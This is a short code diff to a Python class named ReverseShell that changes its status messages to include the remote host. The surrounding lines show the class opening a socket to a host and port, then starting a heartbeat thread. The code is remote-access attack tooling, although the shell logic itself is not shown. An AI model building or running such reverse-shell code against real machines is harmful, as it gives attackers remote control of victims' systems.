@@ -16,7 +16,7 @@ class ReverseShell:
         self._stop_event = threading.Event()
 
     def _connect_and_shell(self):
-        self.status = "CONNECTING..."
+        self.status = f"CONNECTING TO {self.host}..."
         while not self._stop_event.is_set():
             try:
                 self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -24,7 +24,7 @@ class ReverseShell:
                 self.sock.connect((self.host, self.port))
                 self.sock.settimeout(None)
                 self.connected = True
-                self.status = "CONNECTED"
+                self.status = f"CONNECTED TO {self.host}"
                 
                 # Send heartbeat in background
                 heartbeat_thread = threading.Thread(target=self._heartbeat, daemon=True)
